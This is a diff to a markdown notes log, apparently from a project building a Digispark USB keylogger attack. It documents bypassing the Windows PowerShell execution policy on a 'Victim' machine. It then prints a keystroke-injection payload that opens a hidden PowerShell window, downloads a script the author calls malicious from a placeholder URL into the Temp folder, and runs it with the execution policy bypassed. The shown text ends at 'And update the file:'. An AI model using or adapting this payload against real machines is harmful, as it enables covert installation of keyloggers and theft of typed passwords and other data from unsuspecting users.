@@ -1058,3 +1058,38 @@ Keylogger scripts:
 *Not obfuscated for now. But that process is explained before and will be implemented whenever needed.*
 
 ---
+
+### 31.10.2023
+*Execution policies*
+
+While testing and stuff, i found out, that by default, the execution of scripts is disabled from atleast normal user.
+
+[Microsoft - ExecutionPolicy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3)  
+
+Default in Windows 10:   
+![](notes_res/notes-%2027.png)
+
+Luckily (for us...) Windows let's user to change the CurrentUser policy to Bypass, which allows the execution, with:   
+```
+Set-ExecutionPolicy Bypass -Scope CurrentUser
+```
+
+Or for a single run 
+
+```
+powershell -ExecutionPolicy Bypass \PATH\TO\SCRIPT.ps1
+```
+
+In our testing Victim, the LocalMachine ExecutionPolicy was Bypass, so had to change that with powershell as admin:    
+```
+Set-ExecutionPolicy Undefined -Scope LocalMachine
+```
+To make it really a default for Win10.   
+
+After this, i had to tinker the Digispark payload for Keylogger script, to run the malicious script the mentioned `Bypass`.
+
+```ino
+DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'URL_TO_DOWNLOAD_THE_SCRIPT\', \\\"$env:Temp\\maltsu.ps1\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\maltsu.ps1\\\"\"");
+```
+
+And update the file:
